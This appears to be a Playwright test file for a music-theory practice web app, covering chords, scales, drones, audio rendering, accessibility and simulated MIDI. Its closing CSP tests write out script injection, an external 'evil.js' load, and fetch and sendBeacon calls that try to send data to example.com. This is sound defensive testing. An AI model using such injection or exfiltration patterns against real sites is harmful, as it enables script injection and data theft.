  assert.equal(await page.isChecked('#hold-tonic'), true);
  await enterChord(page, 'Dm7/G');
  await nextChord(page, 'Ebm7/Ab');
  await lead(page, 'Smooth').locator('button').click();
  await playing(page);
  const drones = await page.evaluate(async () => (await import('/js/main.js')).app.transport.current().stepDrones);
  assert.deepEqual(drones.map((d) => d[0] % 12), [7, 8], 'G under the first chord, A♭ under the second');
  await page.click('#stop');
  await page.waitForTimeout(600);
  assert.equal(await page.evaluate(async () => (await import('/js/main.js')).app.engine.voiceCount()), 0);
  await page.close();
});

test('the now-playing line follows a tempo change', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await playing(page);
  await page.$eval('#bpm', (el) => { el.value = '120'; el.dispatchEvent(new Event('input')); });
  assert.match(await page.textContent('#now-playing'), /120 bpm/);
  await page.click('#stop');
  await page.close();
});

test('a note above or below the keyboard lights no key (the Cmaj7 spread’s D5 is not D3)', async () => {
  const { page } = await open();
  await page.evaluate(() => {
    window.__lit = new Set();
    new MutationObserver((list) => { for (const m of list) if (m.target.classList?.contains('is-sounding')) window.__lit.add(m.target.getAttribute('aria-label').split(',')[0]); })
      .observe(document.getElementById('keyboard'), { subtree: true, attributes: true, attributeFilter: ['class'] });
  });
  await row(page, 'Spread').getByRole('button').click();
  await playing(page);
  await page.waitForTimeout(400);
  await page.click('#stop');
  const lit = await page.evaluate(() => [...window.__lit]);
  assert.ok(lit.length > 0, 'the spread lights its keys');
  for (const k of lit) assert.ok(['C 3', 'B 3', 'E 4', 'A 4'].includes(k), `lit ${k}: ${lit}`);
  await page.close();
});

test('keys do not flash at all when motion is reduced', async () => {
  const { page } = await open();
  await page.emulateMedia({ reducedMotion: 'reduce' });
  await page.evaluate(() => {
    window.__flashes = 0;
    new MutationObserver((list) => { for (const m of list) if (m.target.classList?.contains('is-sounding')) window.__flashes += 1; })
      .observe(document.getElementById('keyboard'), { subtree: true, attributes: true, attributeFilter: ['class'] });
  });
  await page.click('#play-scale');
  await playing(page);
  await page.waitForTimeout(900);
  await page.click('#stop');
  assert.equal(await page.evaluate(() => window.__flashes), 0);
  await page.close();
});

test('the Gravity picker shows a tonic spelled outside the twelve roots', async () => {
  const { page } = await open();
  await enterChord(page, 'Gb7');
  await page.click('#tab-gravity');
  assert.equal(await page.$eval('#gravity-tonic', (el) => el.selectedOptions[0].textContent), 'F♭');
  await page.close();
});

test('a ringing chord sounds until stopAll, then falls silent (real audio graph)', async () => {
  const { page } = await open();
  const energy = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    class Offline extends OfflineAudioContext {
      constructor() { super(1, 44100, 44100); }
      get state() { return 'running'; }
    }
    const engine = createEngine({ AudioContextCtor: Offline, volume: 1 });
    await engine.resume();
    const ctx = engine.context();
    engine.note(48, 0, 4, { gain: 0.12 });
    engine.note(55, 0, 4, { gain: 0.12 });
    ctx.suspend(0.5).then(() => { engine.stopAll(); ctx.resume(); });
    const data = (await ctx.startRendering()).getChannelData(0);
    const rms = (a, b) => Math.sqrt(data.slice(a * 44100, b * 44100).reduce((s, v) => s + v * v, 0) / ((b - a) * 44100));
    return { during: rms(0.1, 0.4), after: rms(0.8, 1) };
  });
  assert.ok(energy.during > 0.01, JSON.stringify(energy));
  assert.ok(energy.after < 0.0005, JSON.stringify(energy));
  await page.close();
});

test('if the piano cannot load, a note sounds like a struck electric-piano key: bright attack that mellows and fades', async () => {
  const { page } = await open();
  const shape = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    class Offline extends OfflineAudioContext {
      constructor() { super(1, 44100, 44100); }
      get state() { return 'running'; }
    }
    const engine = createEngine({ AudioContextCtor: Offline, volume: 1, loadSamples: async () => { throw new Error('offline'); } });
    await engine.resume();
    if (engine.sound() !== 'electric') throw new Error(engine.sound());
    engine.note(57, 0, 1);
    const x = (await engine.context().startRendering()).getChannelData(0);
    const win = (a, b) => x.subarray(Math.round(a * 44100), Math.round(b * 44100));
    const rms = (a, b) => { const w = win(a, b); return Math.sqrt(w.reduce((s, v) => s + v * v, 0) / w.length); };
    // Brightness: energy of the sample-to-sample change relative to the signal's energy.
    const bright = (a, b) => { const w = win(a, b); let d = 0, e = 0; for (let i = 1; i < w.length; i++) { d += (w[i] - w[i - 1]) ** 2; e += w[i] ** 2; } return d / e; };
    return { early: rms(0.01, 0.06), late: rms(0.5, 0.6), brightEarly: bright(0.01, 0.06), brightLate: bright(0.5, 0.6) };
  });
  assert.ok(shape.early > 0.02, JSON.stringify(shape));
  assert.ok(shape.brightEarly > shape.brightLate * 1.5, `attack should be brighter than the ring: ${JSON.stringify(shape)}`);
  assert.ok(shape.late < shape.early, `should fade: ${JSON.stringify(shape)}`);
  assert.ok(shape.late > shape.early * 0.05, `should still ring: ${JSON.stringify(shape)}`);
  await page.close();
});

test('the chord table scrolls from the keyboard at phone width, so the Note column is reachable', async () => {
  const page = await browser.newPage({ viewport: { width: 320, height: 800 } });
  await page.goto(server.url + '/#reference');
  const scroller = page.locator('.table-scroll');
  assert.equal(await scroller.getAttribute('tabindex'), '0');
  assert.equal(await scroller.getAttribute('role'), 'region');
  assert.equal(await scroller.getAttribute('aria-labelledby'), 'h-chords');
  await scroller.focus();
  for (let i = 0; i < 5; i++) await page.keyboard.press('ArrowRight');
  // Newer Chromium scrolls smoothly from the keyboard, so wait for the scroll to land.
  await page.waitForFunction(() => document.querySelector('.table-scroll').scrollLeft > 0, null, { timeout: 3000 });
  await page.close();
});

test('organ and pad drones hold steadily, then fall silent when released (real audio graph)', async () => {
  const { page } = await open();
  const result = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    async function render(instrument) {
      class Offline extends OfflineAudioContext {
        constructor() { super(1, 44100 * 4, 44100); }
        get state() { return 'running'; }
      }
      const engine = createEngine({ AudioContextCtor: Offline, volume: 1, loadSamples: async () => new Map() });
      await engine.resume();
      const ctx = engine.context();
      engine.hold([48, 55], 0, { gain: 0.12, instrument });
      ctx.suspend(3).then(() => { engine.stopAll(0.1); ctx.resume(); });
      const x = (await ctx.startRendering()).getChannelData(0);
      const rms = (a, b) => { const w = x.subarray(a * 44100, b * 44100); return Math.sqrt(w.reduce((s, v) => s + v * v, 0) / w.length); };
      return { early: rms(instrument === 'pad' ? 1.6 : 0.2, instrument === 'pad' ? 2.0 : 0.6), late: rms(2.5, 2.9), after: rms(3.3, 3.5) };
    }
    return { organ: await render('organ'), pad: await render('pad') };
  });
  for (const [name, r] of Object.entries(result)) {
    assert.ok(r.early > 0.01, `${name} sounds: ${JSON.stringify(r)}`);
    assert.ok(r.late > r.early * 0.5, `${name} holds: ${JSON.stringify(r)}`);
    assert.ok(r.after < 0.002, `${name} stops: ${JSON.stringify(r)}`);
  }
  await page.close();
});

test('a pad note shorter than its swell still sounds (it swells faster to fit)', async () => {
  const { page } = await open();
  const r = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    class Offline extends OfflineAudioContext {
      constructor() { super(1, 44100 * 3, 44100); }
      get state() { return 'running'; }
    }
    const e = createEngine({ AudioContextCtor: Offline, volume: 0.7 });
    await e.resume();
    e.note(48, 0, 1, { gain: 0.12, instrument: 'pad' });
    const x = (await e.context().startRendering()).getChannelData(0);
    const rms = (a, b) => { const w = x.subarray(a * 44100, b * 44100); return Math.sqrt(w.reduce((s, v) => s + v * v, 0) / w.length); };
    return { during: rms(0.3, 0.9), after: rms(2.5, 2.9) };
  });
  assert.ok(r.during > 0.005, `a one-second pad note is heard: ${JSON.stringify(r)}`);
  assert.ok(r.after < r.during / 20, `and lets go: ${JSON.stringify(r)}`);
  await page.close();
});

test('if the bass cannot load during a lead, each chord’s drone is the organ’s root and fifth', async () => {
  const { page } = await open();
  await page.route('**/audio/bass/**', (route) => route.fulfill({ status: 404, body: '' }));
  await page.selectOption('#drone-sound', 'bass');
  assert.equal(await page.isChecked('#hold-tonic'), true);
  await nextChord(page, 'Dm7');
  await lead(page, 'Smooth').locator('button').click();
  await playing(page);
  await page.waitForFunction(async () => (await import('/js/main.js')).app.transport.current()?.droneSound === 'organ');
  const p = await page.evaluate(async () => { const c = (await import('/js/main.js')).app.transport.current(); return { drones: c.stepDrones, drone: c.drone ?? null }; });
  assert.deepEqual(p.drones.map((d) => d.length), [2, 2], JSON.stringify(p));
  assert.ok(p.drones.every((d) => d[0] >= 48), `organ drones sit in octave 3, not the bass's octave 2: ${JSON.stringify(p)}`);
  assert.equal(p.drone, null, 'a lead carries its drones per chord');
  await page.click('#stop');
  await page.close();
});

test('the upright bass plays its recordings from this site: plucked, then gone', async () => {
  const { page, problems } = await open();
  const shape = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    class Offline extends OfflineAudioContext {
      constructor() { super(1, 44100 * 3, 44100); }
      get state() { return 'running'; }
    }
    const engine = createEngine({ AudioContextCtor: Offline, volume: 1 });
    await engine.resume();
    const ready = await engine.ensure('bass');
    engine.note(36, 0, 1.5, { gain: 0.12, instrument: 'bass' });
    const x = (await engine.context().startRendering()).getChannelData(0);
    const rms = (a, b) => { const w = x.subarray(a * 44100, b * 44100); return Math.sqrt(w.reduce((s, v) => s + v * v, 0) / w.length); };
    return { ready, early: rms(0.02, 0.3), after: rms(2.4, 2.8) };
  });
  assert.equal(shape.ready, 'ready');
  assert.ok(shape.early > 0.005, JSON.stringify(shape));
  assert.ok(shape.after < 0.001, JSON.stringify(shape));
  assert.deepEqual(problems, []);
  await page.close();
});

test('the drone sounds sit at a similar loudness: pad, piano and each bass note within 6 dB of the organ', async () => {
  const { page } = await open();
  const db = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    const { INSTRUMENTS } = await import('/js/audio/instruments.js');
    // Each at its drone gain. Held sounds are measured once they've swelled in (the pad takes 1.5 s).
    async function level(instrument, midis, from = 0, to = 0.5) {
      class Offline extends OfflineAudioContext {
        constructor() { super(1, 44100 * 3, 44100); }
        get state() { return 'running'; }
      }
      const e = createEngine({ AudioContextCtor: Offline, volume: 0.7 });
      await e.resume();
      await e.ensure(instrument);
      const gain = 0.12 * INSTRUMENTS[instrument].droneLevel;
      if (instrument === 'organ' || instrument === 'pad') e.hold(midis, 0, { gain, instrument });
      else midis.forEach((m) => e.note(m, 0, 0.9, { gain, instrument }));
      const w = (await e.context().startRendering()).getChannelData(0).subarray(from * 44100, to * 44100);
      return 20 * Math.log10(Math.sqrt(w.reduce((s, v) => s + v * v, 0) / w.length));
    }
    const out = { organ: await level('organ', [48, 55]), pad: await level('pad', [48, 55], 1.8, 2.3), piano: await level('piano', [48, 55]) };
    for (const m of [36, 38, 40, 42, 45, 47]) out[`bass${m}`] = await level('bass', [m]);
    return out;
  });
  for (const [k, v] of Object.entries(db)) {
    if (k !== 'organ') assert.ok(Math.abs(v - db.organ) <= 6, `${k} ${v.toFixed(1)} dB vs organ ${db.organ.toFixed(1)} dB: ${JSON.stringify(db)}`);
  }
  await page.close();
});

test('a note plays the recorded piano from this site: it strikes, rings and dies away', async () => {
  const { page, problems } = await open();
  const shape = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    class Offline extends OfflineAudioContext {
      constructor() { super(1, 44100 * 3, 44100); }
      get state() { return 'running'; }
    }
    const engine = createEngine({ AudioContextCtor: Offline, volume: 1 });
    await engine.resume();
    engine.note(62, 0, 2.5); // D4: retuned from the D♯4 recording
    const x = (await engine.context().startRendering()).getChannelData(0);
    const rms = (a, b) => { const w = x.subarray(a * 44100, b * 44100); return Math.sqrt(w.reduce((s, v) => s + v * v, 0) / w.length); };
    return { sound: engine.sound(), early: rms(0.02, 0.2), late: rms(2, 2.4), after: rms(2.8, 3) };
  });
  assert.equal(shape.sound, 'piano');
  assert.ok(shape.early > 0.02, JSON.stringify(shape));
  assert.ok(shape.late < shape.early * 0.5, `should die away: ${JSON.stringify(shape)}`);
  assert.ok(shape.after < 0.002, `silent after the key is let go: ${JSON.stringify(shape)}`);
  assert.deepEqual(problems, []);
  await page.close();
});

test('Stop after defaults to 8 bars, is shared with Gravity, and is remembered', async () => {
  const { page } = await open();
  assert.equal(await page.inputValue('#stop-after'), '8');
  const labels = await page.$$eval('#stop-after option', (os) => os.map((o) => o.textContent));
  assert.deepEqual(labels, ['2 bars', '4 bars', '6 bars', '8 bars', 'Until I press Stop']);
  await page.selectOption('#stop-after', '4');
  assert.equal(await page.inputValue('#gravity-stop-after'), '4');
  await page.reload();
  await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0);
  assert.equal(await page.inputValue('#stop-after'), '4');
  await page.goto(server.url + '/#gravity');
  await page.selectOption('#gravity-stop-after', '0');
  assert.equal(await page.inputValue('#stop-after'), '0');
  await page.close();
});

test('pressing Drone loads the piano and plays it under the CSP', async () => {
  const { page, problems } = await open();
  const audio = [];
  page.on('request', (r) => { if (r.url().includes('/audio/piano/')) audio.push(r.url()); });
  await page.click('#drone');
  await page.waitForFunction(() => /^Playing/.test(document.getElementById('now-playing').textContent));
  assert.equal(audio.length, 25);
  assert.ok(audio.every((u) => u.startsWith(server.url)));
  assert.deepEqual(problems, []);
  await page.click('#stop');
  await page.close();
});

test('clicking a scale card selects it without playing', async () => {
  const { page } = await open();
  await page.locator('.ladder-card').nth(1).click();
  assert.equal(await page.getAttribute('.ladder-card >> nth=1', 'aria-pressed'), 'true');
  assert.match(await page.textContent('#selected-scale'), /Lydian Augmented/);
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  assert.match(await page.textContent('#now-playing'), /Silent/);
  await page.click('#play-scale');
  await playing(page);
  assert.match(await page.textContent('#now-playing'), /Lydian Augmented/);
  await page.click('#stop');
  await page.close();
});

test('scale cards show the notes from the chord root, with the familiar mode name', async () => {
  const { page } = await open();
  await enterChord(page, 'Cm7');
  const first = page.locator('.ladder-card').first();
  assert.match(await first.textContent(), /From C: C D E♭ F G A B♭ · C Dorian/);
  await page.selectOption('#start-on', 'root');
  await page.click('#play-scale');
  await playing(page);
  assert.match(await page.textContent('#now-playing'), /E♭ Lydian from C \(C Dorian\)/);
  await page.click('#stop');
  await page.close();
});

test('the drone plays the bass note by default, and the picker changes it', async () => {
  const { page } = await open();
  assert.equal(await page.inputValue('#drone-on'), 'bass');
  await enterChord(page, 'Cmaj7/E');
  await page.click('#drone');
  await playing(page);
  assert.match(await page.textContent('#now-playing'), /Drone on E\b/);
  await page.selectOption('#drone-on', 'tonic');
  await enterChord(page, 'Cm7');
  await page.click('#drone');
  await page.waitForFunction(() => /Drone on E♭/.test(document.getElementById('now-playing').textContent));
  assert.equal(await page.isVisible('#drone-other'), false);
  await page.selectOption('#drone-on', 'other');
  assert.equal(await page.isVisible('#drone-other'), true);
  await page.click('#stop');
  await page.close();
});

test('changing the chord type keeps the slash bass', async () => {
  const { page } = await open();
  await enterChord(page, 'Cmaj7/E');
  await page.selectOption('#chord-quality', 'm7');
  assert.equal(await page.inputValue('#chord-text'), 'Cm7/E');
  await enterChord(page, 'G7');
  await page.selectOption('#chord-quality', 'maj7');
  assert.equal(await page.inputValue('#chord-text'), 'Gmaj7');
  await page.close();
});

test('Learn: six sections, each example plays and shows where it is', async () => {
  const { page, problems } = await open('/#learn');
  assert.equal(await page.locator('#view-learn h2').count(), 6);
  const section = page.locator('#learn-horizontal');
  await section.locator('.learn-play').click();
  await page.waitForFunction(() => /Dm7/.test(document.querySelector('#learn-horizontal .learn-now').textContent));
  await page.waitForFunction(() => document.querySelectorAll('#learn-horizontal [aria-current="true"]').length === 1);
  await section.locator('.learn-stop').click();
  await page.waitForFunction(() => document.getElementById('live').textContent === 'Stopped');
  assert.equal(await page.locator('#learn-horizontal [aria-current="true"]').count(), 0);
  assert.deepEqual(problems, []);
  await page.close();
});

test('Learn: an example replaces whatever Practice was playing', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await page.click('#tab-learn');
  await page.locator('#learn-vertical .learn-play').click();
  await page.waitForFunction(() => /Cm7/.test(document.querySelector('#learn-vertical .learn-now').textContent));
  await page.click('#tab-practice');
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  await page.click('#stop');
  await page.close();
});

test('Learn: the first chord is highlighted as soon as an example starts', async () => {
  const { page } = await open('/#learn');
  await page.locator('#learn-home-away .learn-play').click();
  await playing(page); // the piano loads on the first press; then the highlight must be immediate
  await page.waitForFunction(() => document.querySelector('#learn-home-away .learn-chords li')?.getAttribute('aria-current') === 'true', null, { timeout: 1500 });
  await page.locator('#learn-home-away .learn-stop').click();
  await page.close();
});

test('Learn: changing the Practice chord does not replace a playing example', async () => {
  const { page } = await open('/#learn');
  await page.locator('#learn-horizontal .learn-play').click();
  await playing(page);
  await page.click('#tab-practice');
  await enterChord(page, 'G7');
  await page.waitForTimeout(300);
  assert.match(await page.textContent('#now-playing'), /ii–V–I/);
  await page.click('#stop');
  await page.close();
});

test('Practice says when the bass is outside the parent scale', async () => {
  const { page } = await open();
  await enterChord(page, 'D/C');
  assert.match(await page.textContent('#bass-note'), /bass C isn't in D Lydian/);
  await enterChord(page, 'Cmaj7/E');
  assert.equal((await page.textContent('#bass-note')).trim(), '');
  await page.close();
});

test('Learn: the tradition label follows the heading', async () => {
  const { page } = await open('/#learn');
  const order = await page.evaluate(() => [...document.querySelector('#learn-home-away').children].slice(0, 2).map((e) => e.tagName));
  assert.deepEqual(order, ['H2', 'P']);
  await page.close();
});

// ---------- MIDI (simulated keyboard) ----------

// Runs inside the page: Playwright passes only the function's text, so
// options arrive as its argument (initArg), not from the test's scope.
const fakeMidi = ({ reject = false } = {}) => {
  window.__midiRequested = false;
  const input = { name: 'Test Keys', onmidimessage: null };
  const access = { inputs: new Map([['k', input]]), onstatechange: null };
  navigator.requestMIDIAccess = async (opts) => {
    window.__midiRequested = true;
    window.__midiOpts = opts;
    if (reject) throw new DOMException('denied', 'NotAllowedError');
    return access;
  };
  const send = (data) => input.onmidimessage?.({ data: Uint8Array.from(data) });
  let down = [];
  window.__midi = {
    play(notes) { down.forEach((n) => send([0x80, n, 0])); down = notes; notes.forEach((n) => send([0x90, n, 100])); },
    release() { down.forEach((n) => send([0x80, n, 0])); down = []; },
  };
};

test('MIDI: nothing is requested until Connect is pressed', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.waitForTimeout(300);
  assert.equal(await page.evaluate(() => window.__midiRequested), false);
  assert.match(await page.textContent('#midi-status'), /MIDI is off/);
  await page.close();
});

test('MIDI: hold a chord on the keyboard and it becomes the chord', async () => {
  const { page, problems } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening to Test Keys/.test(document.getElementById('midi-status').textContent));
  assert.deepEqual(await page.evaluate(() => window.__midiOpts), { sysex: false });
  assert.equal(await page.getAttribute('#midi-connect', 'aria-pressed'), 'true');
  await page.evaluate(() => window.__midi.play([62, 65, 69, 72]));
  await page.waitForFunction(() => document.getElementById('chord-text').value === 'Dm7');
  assert.match(await page.textContent('#tonic'), /F/);
  assert.match(await page.textContent('#midi-heard'), /Dm7/);
  await page.evaluate(() => window.__midi.release());
  await page.waitForTimeout(300);
  assert.equal(await page.inputValue('#chord-text'), 'Dm7');
  await page.evaluate(() => window.__midi.play([60, 62, 64, 65]));
  await page.waitForFunction(() => /isn't a chord I know yet/.test(document.getElementById('midi-heard').textContent));
  assert.equal(await page.inputValue('#chord-text'), 'Dm7');
  await page.click('#midi-disconnect');
  assert.match(await page.textContent('#midi-status'), /MIDI is off/);
  assert.equal(await page.getAttribute('#midi-connect', 'aria-pressed'), 'false');
  assert.deepEqual(problems, []);
  await page.close();
});

test('MIDI: striking the same chord again does not restart or re-announce', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  await page.evaluate(() => window.__midi.play([62, 65, 69, 72]));
  await page.waitForFunction(() => /Lydian tonic F/.test(document.getElementById('live').textContent));
  await page.evaluate(() => {
    window.__liveChanges = 0;
    new MutationObserver(() => { window.__liveChanges += 1; }).observe(document.getElementById('live'), { childList: true, characterData: true, subtree: true });
  });
  await page.evaluate(() => { window.__midi.release(); window.__midi.play([62, 65, 69, 72]); });
  await page.waitForTimeout(600);
  assert.equal(await page.evaluate(() => window.__liveChanges), 0);
  await page.close();
});

test('MIDI: one clear announcement per chord, and the heard line is not a second live region', async () => {
  const { page } = await open('/', { init: fakeMidi });
  assert.equal(await page.getAttribute('#midi-heard', 'aria-live'), null);
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  await page.click('#play-scale');
  await playing(page);
  await page.evaluate(() => window.__midi.play([55, 59, 62, 65]));
  await page.waitForFunction(() => /G7: Lydian tonic F/.test(document.getElementById('live').textContent));
  assert.match(await page.textContent('#live'), /Playing F Lydian/);
  await page.evaluate(() => window.__midi.play([60, 62, 64, 65]));
  await page.waitForFunction(() => /isn't a chord I know yet/.test(document.getElementById('live').textContent));
  await page.click('#stop');
  await page.close();
});

test('MIDI: the button label stays fixed; its pressed state tells the story', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  assert.match(await page.textContent('#midi-connect'), /Connect MIDI keyboard/);
  assert.equal(await page.getAttribute('#midi-connect', 'aria-describedby'), null);
  await page.close();
});

test('MIDI: the Connect button is a true toggle', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  await page.click('#midi-connect');
  assert.match(await page.textContent('#midi-status'), /MIDI is off/);
  assert.equal(await page.getAttribute('#midi-connect', 'aria-pressed'), 'false');
  await page.close();
});

test('MIDI: a browser without Web MIDI gets a helpful note', async () => {
  const { page } = await open('/', { init: () => { delete Navigator.prototype.requestMIDIAccess; delete navigator.requestMIDIAccess; } });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /isn't available in this browser/.test(document.getElementById('midi-status').textContent));
  await page.close();
});

test('MIDI: a declined permission is explained', async () => {
  const { page } = await open('/', { init: fakeMidi, initArg: { reject: true } });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Permission was declined/.test(document.getElementById('midi-status').textContent));
  await page.close();
});

// ---------- Attack tests: the policy must stop these ----------

test('injected inline scripts and handlers do not run', async () => {
  const { page, problems } = await open();
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__x = 1';
    document.body.append(s);
    const img = document.createElement('img');
    img.setAttribute('src', 'data:,x');
    img.setAttribute('onerror', 'window.__y = 1');
    document.body.append(img);
    const div = document.createElement('div');
    div.innerHTML = '<img src="nope.png" onerror="window.__z = 1">';
    document.body.append(div);
  });
  await page.waitForTimeout(300);
  assert.equal(await page.evaluate(() => window.__x), undefined);
  assert.equal(await page.evaluate(() => window.__y), undefined);
  assert.equal(await page.evaluate(() => window.__z), undefined);
  assert.ok(problems.some((p) => /Content Security Policy/.test(p)));
  await page.close();
});

test('scripts from other sites are refused', async () => {
  const { page } = await open();
  const loaded = await page.evaluate(() => new Promise((resolve) => {
    const s = document.createElement('script');
    s.src = 'https://example.com/evil.js';
    s.onload = () => resolve(true);
    s.onerror = () => resolve(false);
    document.head.append(s);
  }));
  assert.equal(loaded, false);
  await page.close();
});

test('the page cannot send data anywhere', async () => {
  const { page, problems } = await open();
  const outbound = [];
  page.on('request', (r) => { if (!r.url().startsWith(server.url)) outbound.push(r.url()); });
  const outcome = await page.evaluate(async () => {
    try { await fetch('https://example.com/steal?x=1'); return 'sent'; } catch { return 'blocked'; }
  });
  assert.equal(outcome, 'blocked');
  // sendBeacon reports true when it queues; what matters is that nothing leaves.
  await page.evaluate(() => { try { navigator.sendBeacon('https://example.com/b', 'x'); } catch {} });
  await page.waitForTimeout(400);
  assert.deepEqual(outbound.filter((u) => !u.startsWith('data:')), []);
  assert.ok(problems.some((p) => /connect-src/.test(p)));
  await page.close();
});

test('another site cannot frame the app', async () => {
  const { createServer } = await import('node:http');
  const evil = createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!doctype html><iframe id="f" src="${server.url}/"></iframe>`);
  });
  await new Promise((r) => evil.listen(0, '127.0.0.1', r));
  const page = await browser.newPage();
  try {
    await page.goto(`http://localhost:${evil.address().port}/`);
    await page.waitForTimeout(800);
    const frame = page.frames().find((f) => f !== page.mainFrame());
    const inside = frame ? await frame.$('#tonic').catch(() => null) : null;
    assert.equal(inside, null);
  } finally {
    await page.close();
    await new Promise((r) => evil.close(r));
  }
});
